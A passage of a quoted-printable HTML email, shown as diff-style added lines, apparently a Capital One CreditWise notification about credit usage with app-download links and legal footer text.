+DING-BOTTOM: 24px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 12px; =
+LINE-HEIGHT: 24px; PADDING-RIGHT: 12px'>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px">To lenders, opening too ma=
+ny new accounts in a short window of time could point to credit problems.</=
+P></TD></TR></TBODY></TABLE></DIV></TD></TR></TBODY></TABLE></TD></TR></TBO=
+DY></TABLE></TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1darkmode style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px;=
+ FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; B=
+ORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rg=
+b(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; L=
+ETTER-SPACING: normal; font-variant-ligatures: normal; font-variant-caps: n=
+ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
+text-decoration-style: initial;=20
+text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 width=3D"10=
+0%" bgColor=3D#ffffff border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
+<TABLE style=3D"BOX-SIZING: border-box; MAX-WIDTH: 544px; WIDTH: 544px; BOR=
+DER-COLLAPSE: collapse; MARGIN: 0px auto" cellSpacing=3D0 cellPadding=3D0 a=
+lign=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box">
+<TABLE class=3Dv1darkaccent style=3D"BOX-SIZING: border-box; BORDER-COLLAPS=
+E: collapse" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#f4f4=
+f4 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 24px; PADDING-RIGHT: 24px">
+<TABLE style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellSpac=
+ing=3D0 cellPadding=3D0 align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; HEIGHT: 0px; BORDER-BO=
+TTOM: rgb(125,125,125) 1px solid; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; LINE-HEIGHT: 0; PADDING-RIGHT: 0px" width=3D640>&nbsp;</TD=
+></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE><=
+/TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1darkmode style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px;=
+ FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; B=
+ORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rg=
+b(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; L=
+ETTER-SPACING: normal; font-variant-ligatures: normal; font-variant-caps: n=
+ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
+text-decoration-style: initial;=20
+text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 width=3D"10=
+0%" bgColor=3D#ffffff border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
+<TABLE style=3D"BOX-SIZING: border-box; MAX-WIDTH: 544px; WIDTH: 544px; BOR=
+DER-COLLAPSE: collapse; MARGIN: 0px auto" cellSpacing=3D0 cellPadding=3D0 a=
+lign=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box">
+<TABLE class=3Dv1darkaccent style=3D"BOX-SIZING: border-box; BORDER-COLLAPS=
+E: collapse" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#f4f4=
+f4 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; PADDING-BOTTOM: 24px; =
+PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0; PADDING-RIGHT: 0px">&n=
+bsp;</TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; PADDING-BOTTOM: 0px; T=
+EXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 12px; PADDING-RIGHT: 12p=
+x" dir=3Dltr>
+<DIV class=3Dv1column style=3D"BOX-SIZING: border-box; MAX-WIDTH: 103px; WI=
+DTH: 103px; VERTICAL-ALIGN: top; DISPLAY: inline-block">
+<TABLE style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" dir=3Dlt=
+r cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 24px; TEXT-ALIGN: cent=
+er; PADDING-TOP: 0px; PADDING-LEFT: 12px; PADDING-RIGHT: 12px">
+<IMG style=3D'BORDER-TOP-STYLE: none; BOX-SIZING: border-box; MAX-WIDTH: 70=
+px !important; BORDER-LEFT-STYLE: none; HEIGHT: auto; WIDTH: 70px; VERTICAL=
+-ALIGN: bottom; BORDER-BOTTOM-STYLE: none; COLOR: rgb(20,20,20); TEXT-ALIGN=
+: center; FONT: 20px/30px Optimist, "Helvetica Neue", Helvetica, Arial, san=
+s-serif; BORDER-RIGHT-STYLE: none' border=3D0=20
+src=3D"https://mi.capitalone.com/p/rp/bed25787d806219a.png?icon_show_border=
+=3Dtrue&amp;icon_color=3D013D5B&amp;icon_id=3Dprimary-credit&amp;icon_inner=
+_color=3DFFFFFF&amp;icon_size=3D70&amp;icon_background=3DF4F4F4" width=3D70=
+></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 8px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; PADDING-RIGHT: 0px">&nbsp;</TD></TR></TBODY></TABLE></D=
+IV><SPAN>&nbsp;</SPAN>=20
+<DIV class=3Dv1column style=3D"BOX-SIZING: border-box; MAX-WIDTH: 417px; WI=
+DTH: 417px; VERTICAL-ALIGN: top; DISPLAY: inline-block">
+<TABLE style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" dir=3Dlt=
+r cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D'BOX-SIZING: border-box; FONT-FAMILY: Optimist, "Helvetica Neue=
+", Helvetica, Arial, sans-serif; COLOR: rgb(20,20,20); PADDING-BOTTOM: 8px;=
+ TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 12px; PADDING-RIGHT: 12p=
+x'>
+<H2 style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-WEIGHT: 600; MAR=
+GIN: 0px; LINE-HEIGHT: 24px"><STRONG style=3D"BOX-SIZING: border-box; FONT-=
+WEIGHT: bolder">Credit<SPAN>&nbsp;</SPAN></STRONG><STRONG style=3D"BOX-SIZI=
+NG: border-box; FONT-WEIGHT: bolder">usage<BR class=3Dv1softBreak style=3D"=
+BOX-SIZING: border-box"></STRONG><SPAN style=3D"BOX-SIZING: border-box; FON=
+T-WEIGHT: 600; COLOR: rgb(1,61,91)">30</SPAN><SPAN style=3D"BOX-SIZING: bor=
+der-box; FONT-WEIGHT: 600; COLOR: rgb(1,61,91)">
+% ? 27% of total credit used</SPAN></H2></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D'BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-FAMILY: Optimist=
+, "Helvetica Neue", Helvetica, Arial, sans-serif; COLOR: rgb(20,20,20); PAD=
+DING-BOTTOM: 24px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 12px; =
+LINE-HEIGHT: 24px; PADDING-RIGHT: 12px'>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px">See how much credit you ar=
+e using compared to your total credit&#8212;the lower your credit usage, th=
+e better.</P></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 8px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; PADDING-RIGHT: 0px">&nbsp;</TD></TR></TBODY></TABLE></D=
+IV></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></=
+TABLE>
+<TABLE class=3Dv1darkmode style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px;=
+ FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; B=
+ORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rg=
+b(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; L=
+ETTER-SPACING: normal; font-variant-ligatures: normal; font-variant-caps: n=
+ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
+text-decoration-style: initial;=20
+text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 width=3D"10=
+0%" bgColor=3D#ffffff border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; PADDING-BOTTOM: 32px; =
+PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0; PADDING-RIGHT: 0px">&n=
+bsp;</TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1darkmode style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px;=
+ FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; B=
+ORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rg=
+b(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; L=
+ETTER-SPACING: normal; font-variant-ligatures: normal; font-variant-caps: n=
+ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
+text-decoration-style: initial;=20
+text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 width=3D"10=
+0%" bgColor=3D#ffffff border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 24px; TEXT-ALIGN: cent=
+er; PADDING-TOP: 0px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px">
+<TABLE class=3Dv1cssbutton style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE=
+: collapse; border-radius: 4px" cellSpacing=3D0 cellPadding=3D0 align=3Dcen=
+ter bgColor=3D#0276b1 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3Dv1cssbutton style=3D"BOX-SIZING: border-box; TEXT-ALIGN: center=
+; LINE-HEIGHT: 30px" width=3D300>
+<A style=3D'BOX-SIZING: border-box; TEXT-DECORATION: none; WIDTH: 300px; CO=
+LOR: rgb(0,172,255); FONT: 20px/30px Optimist, "Helvetica Neue", Helvetica,=
+ Arial, sans-serif; DISPLAY: inline-block; BACKGROUND-COLOR: transparent' h=
+ref=3D"https://click-notification.capitalone.com/f/a/btqChL8Ssn-mhXAsB8PajA=
+~~/AAAAARA~/t1ZQCw9dCuwMM0_LZiYQKxxcElSWaHBg7fa3u5q59MTxVmXylEBCvEIpkHJXFUa=
+yo4fHlMObyEbZdyn7p8ViqGkIs5ierCAs5RK7597R_nZlndqcHBgWoK7sF7UOmYpg" rel=3Dno=
+referrer target=3D_blank>
+<STRONG style=3D"BOX-SIZING: border-box; FONT-WEIGHT: 400; COLOR: rgb(255,2=
+55,255); PADDING-BOTTOM: 9px; PADDING-TOP: 9px; PADDING-LEFT: 16px; DISPLAY=
+: inline-block; PADDING-RIGHT: 16px">See your score</STRONG></A></TD></TR><=
+/TBODY></TABLE></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; PADDING-BOTTOM: 8px; P=
+ADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0; PADDING-RIGHT: 0px">&nb=
+sp;</TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1darkmode style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px;=
+ FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; B=
+ORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rg=
+b(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; L=
+ETTER-SPACING: normal; font-variant-ligatures: normal; font-variant-caps: n=
+ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
+text-decoration-style: initial;=20
+text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 width=3D"10=
+0%" bgColor=3D#ffffff border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D'BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-FAMILY: Optimist=
+, "Helvetica Neue", Helvetica, Arial, sans-serif; COLOR: rgb(20,20,20); PAD=
+DING-BOTTOM: 24px; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 24px=
+; LINE-HEIGHT: 24px; PADDING-RIGHT: 24px'>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px"><STRONG style=3D"BOX-SIZIN=
+G: border-box; FONT-WEIGHT: bolder">Check your credit score and other key f=
+actors with the CreditWise<SPAN>&nbsp;</SPAN></STRONG><STRONG style=3D"BOX-=
+SIZING: border-box; FONT-WEIGHT: bolder">app.</STRONG><BR class=3Dv1softBre=
+ak style=3D"BOX-SIZING: border-box">
+<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; COLOR: rgb(2,118=
+,177); BACKGROUND-COLOR: transparent" href=3D"https://click-notification.ca=
+pitalone.com/f/a/HvtSx29_bB9GtdmFvx1Rfw~~/AAAAARA~/t1ZQCw9dCuwMM0_LZiYQK5Ob=
+I6mQuWrU1j60zGhDKY41ykQciADyXC_6tSzP3NRsVw79V_g-Ld1_GF2YO4X_NJRD-MCOI40g1xM=
+sqkY77UcCXK99w5s8urR2Zgld4hzU" rel=3Dnoreferrer target=3D_blank><SPAN class=
+=3Dv1textLink style=3D"BOX-SIZING: border-box; BORDER-BOTTOM: 1px solid; PA=
+DDING-BOTTOM: 1px">
+Download the CreditWise mobile app today.</SPAN></A></P></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; PADDING-BOTTOM: 8px; P=
+ADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0; PADDING-RIGHT: 0px">&nb=
+sp;</TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1footer style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; F=
+ONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BOR=
+DER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(=
+44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LET=
+TER-SPACING: normal; BACKGROUND-COLOR: rgb(244,244,244); font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
+xt-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial" cellSpacing=
+=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D'BOX-SIZING: border-box; COLOR: rgb(105,105,105); PADDING-BOTTO=
+M: 8px; TEXT-ALIGN: left; PADDING-TOP: 24px; FONT: 10px/16px Optimist, "Hel=
+vetica Neue", Helvetica, Arial, sans-serif; PADDING-LEFT: 24px; PADDING-RIG=
+HT: 24px'>
+<H2 style=3D"BOX-SIZING: border-box; FONT-SIZE: 10px; FONT-WEIGHT: 600; MAR=
+GIN: 0px 0px 16px; LINE-HEIGHT: 16px">About this message</H2>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px">The CreditWise Si=
+mulator provides an estimate of your score change and does not guarantee ho=
+w your score may change.<BR style=3D"BOX-SIZING: border-box"><BR style=3D"B=
+OX-SIZING: border-box">Web access is needed to use the mobile app. Check wi=
+th your service provider for details on specific fees and charges.</P></TD>=
+</TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; HEIGHT: 1px; PADDING-B=
+OTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 24px; LINE-HEIGHT: 0; PADDING-R=
+IGHT: 24px">
+<DIV style=3D"BOX-SIZING: border-box; BORDER-BOTTOM: rgb(125,125,125) 1px s=
+olid">&nbsp;</DIV></TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1footer style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; F=
+ONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; BOR=
+DER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(=
+44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LET=
+TER-SPACING: normal; BACKGROUND-COLOR: rgb(244,244,244); font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
+xt-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial" cellSpacing=
+=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D'BOX-SIZING: border-box; COLOR: rgb(105,105,105); PADDING-BOTTO=
+M: 24px; TEXT-ALIGN: left; PADDING-TOP: 24px; FONT: 10px/16px Optimist, "He=
+lvetica Neue", Helvetica, Arial, sans-serif; PADDING-LEFT: 24px; PADDING-RI=
+GHT: 24px'>
+<H2 style=3D"BOX-SIZING: border-box; FONT-SIZE: 10px; FONT-WEIGHT: 600; MAR=
+GIN: 0px 0px 16px; LINE-HEIGHT: 16px">Important information from Capital&nb=
+sp;One</H2>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px"><SPAN class=3Dv1c=
+om-tran style=3D"BOX-SIZING: border-box"><A style=3D"BOX-SIZING: border-box=
+; TEXT-DECORATION: none; COLOR: ; BACKGROUND-COLOR: transparent" href=3D"ht=
+tps://click-notification.capitalone.com/f/a/Ld0Z1idLrhgjitpbKZ2New~~/AAAAAR=
+A~/9IgJYb7cof-KGBxjvhMcu2EESiNIBGUxTjcqHSyKsoUYx55oufGrUX2sk-Wo1cPMNuPlqYV2=
+pNBQS1yTWxA8dV56SyznnSdcXfoiVwlwhPlo7gQVi9BTe2Z3xv8FA-13EptzgVVqrsMxmzmPiaT=
+FKQ~~" rel=3Dnoreferrer target=3D_blank>
+<SPAN class=3Dv1textLink style=3D"BOX-SIZING: border-box; TEXT-DECORATION: =
+underline; text-underline-offset: 1px">Contact us</SPAN></A>&nbsp;&nbsp;|&n=
+bsp;&nbsp;<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; COLOR:=
+ ; BACKGROUND-COLOR: transparent" href=3D"https://click-notification.capita=
+lone.com/f/a/h_KmJgZBhs1fcUGD3duNNg~~/AAAAARA~/xbhj6UvFsHgxI4DFkVuVyNRBruHx=
+0RGZppv6EYHHHI-xmCTLkNXP-_GgYGSvAULCaWy44Dt4NmJkmRQkiIcUoLPsjIwJXak5WuWTebV=
+HQzLAqxX91ia0kftW2BzvBaXx" rel=3Dnoreferrer target=3D_blank>
+<SPAN class=3Dv1textLink style=3D"BOX-SIZING: border-box; TEXT-DECORATION: =
+underline; text-underline-offset: 1px">Privacy</SPAN></A>
+&nbsp;&nbsp;|&nbsp;&nbsp;<A style=3D"BOX-SIZING: border-box; TEXT-DECORATIO=
+N: none; COLOR: ; BACKGROUND-COLOR: transparent" href=3D"https://click-noti=
+fication.capitalone.com/f/a/pHk5AB-oebGY5hCznXPQFQ~~/AAAAARA~/7z6gMhaiBAmvY=
+cZsjtozwwYETWzWk48ICM-Mzj5IWveCIrNNcx5Y2og-vEyO1WcdygC9_DUi20Q_5K1xPmH9PYKS=
+jeFaWLPollqrLHkojxSWNI1ID3Wx5JrCgXUPZ_GfDndPhw0HLU7zPufvOmtOQQ~~" rel=3Dnor=
+eferrer target=3D_blank>
+<SPAN class=3Dv1textLink style=3D"BOX-SIZING: border-box; TEXT-DECORATION: =
+underline; text-underline-offset: 1px">Help&nbsp;prevent&nbsp;fraud</SPAN><=
+/A></SPAN></P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px"><SPAN class=3Dv1c=
+om-tran style=3D"BOX-SIZING: border-box">To ensure delivery, add<SPAN>&nbsp=
+;</SPAN><A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; COLOR: ;=
+ BACKGROUND-COLOR: transparent" rel=3Dnoreferrer><SPAN style=3D"BOX-SIZING:=
+ border-box; TEXT-DECORATION: none">capitalone@notification.capitalone.com<=
+/SPAN></A><SPAN>&nbsp;</SPAN>to your address book.</SPAN></P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px"><SPAN class=3Dv1c=
+om-tran style=3D"BOX-SIZING: border-box">This email was sent to<SPAN>&nbsp;=
+</SPAN><A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; COLOR: ; =
+BACKGROUND-COLOR: transparent" rel=3Dnoreferrer><SPAN style=3D"BOX-SIZING: =
+border-box; TEXT-DECORATION: none">jw@allermetrix.com</SPAN></A><SPAN>&nbsp=
+;</SPAN>
+and contains information directly related to your CreditWise account (inclu=
+ding CreditWise alerts) and other services to which you have subscribed. If=
+ you no longer want to receive these emails, unfortunately you&#8217;ll hav=
+e to&nbsp;<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; COLOR:=
+ ; BACKGROUND-COLOR: transparent"=20
+href=3D"https://click-notification.capitalone.com/f/a/XOkr4bf7XBYvyo6dyVQH3=
+g~~/AAAAARA~/i314zL8lNmB76gQ4jIDorP_yneET2Pl5pWHgQ4tHEhLsM3vE93qzAFZzV2iMW2=
+NBHJgr0z0N6592Hj00y3gVUkYrff70SGLKXWvA1iaPGfU0--WcKBxl50l-ENTUsSfMxnw3t0LbZ=
+-miFPX2PEl94w0O8sASuZxG4WvGR5j6w7KQ8umxgKx8UPW-iHFCrcm6s3P7t627b1s-lNa4vsD_=
+rRL1kfs7P7vjgOaQUkKGvz8~" rel=3Dnoreferrer target=3D_blank><SPAN class=3Dv1=
+textLink style=3D"BOX-SIZING: border-box; TEXT-DECORATION: underline; text-=
+underline-offset: 1px">unenroll from CreditWise</SPAN></A>
+=2E</SPAN></P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px">Where does my Cre=
+ditWise score come from?<BR style=3D"BOX-SIZING: border-box">
+The credit score provided in CreditWise is a FICO&reg; Score 8 based on Tra=
+nsUnion&reg; data. The FICO Score 8 gives you a good sense of your credit h=
+ealth, but it may not be the same score model used by your lender or credit=
+or. The availability of the CreditWise tool and certain features in the too=
+l depends on our ability to obtain your credit history from TransUnion and =
+whether you have sufficient credit history to generate a FICO Score 8. Some=
+ monitoring and alerts may not be available to=20
+you if the information you enter at enrollment does not match the informati=
+on in your credit file at (or you do not have a file at) one or more consum=
+er reporting agencies.</P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px">Capital One does =
+not provide, endorse or guarantee any third-party product, service, informa=
+tion or recommendation listed above. The third parties listed are not affil=
+iated with Capital&nbsp;One and are solely responsible for their products a=
+nd services. All trademarks are the property of their respective owners.</P=
+>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px">Please do not rep=
+ly to this message, as this email inbox is not monitored.<SPAN>&nbsp;</SPAN=
+>
+<A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; COLOR: ; BACKGRO=
+UND-COLOR: transparent" href=3D"https://click-notification.capitalone.com/f=
+/a/Ld0Z1idLrhgjitpbKZ2New~~/AAAAARA~/9IgJYb7cof-KGBxjvhMcu2EESiNIBGUxTjcqHS=
+yKsoUYx55oufGrUX2sk-Wo1cPMNuPlqYV2pNBQS1yTWxA8dV56SyznnSdcXfoiVwlwhPlo7gQVi=
+9BTe2Z3xv8FA-13EptzgVVqrsMxmzmPiaTFKQ~~" rel=3Dnoreferrer target=3D_blank><=
+SPAN class=3Dv1textLink style=3D"BOX-SIZING: border-box; TEXT-DECORATION: u=
+nderline; text-underline-offset: 1px">
+To contact us, visit www.capitalone.com/help-center/contact-us.</SPAN></A><=
+/P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px">Products and serv=
+ices are offered by Capital&nbsp;One, N.A.</P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px">FICO is a registe=
+red trademark of Fair Isaac Corporation in the United States and other coun=
+tries.</P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 16px">&copy; 2025 Capit=
+al&nbsp;One. Capital&nbsp;One is a federally registered service mark.</P>
+<P class=3Dv1info style=3D"BOX-SIZING: border-box; MARGIN: 0px">CWMR24 4910=
+8 3378634</P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 16px 0px 0px">TP1001</P></TD></=
+TR></TBODY></TABLE></BODY></HTML>
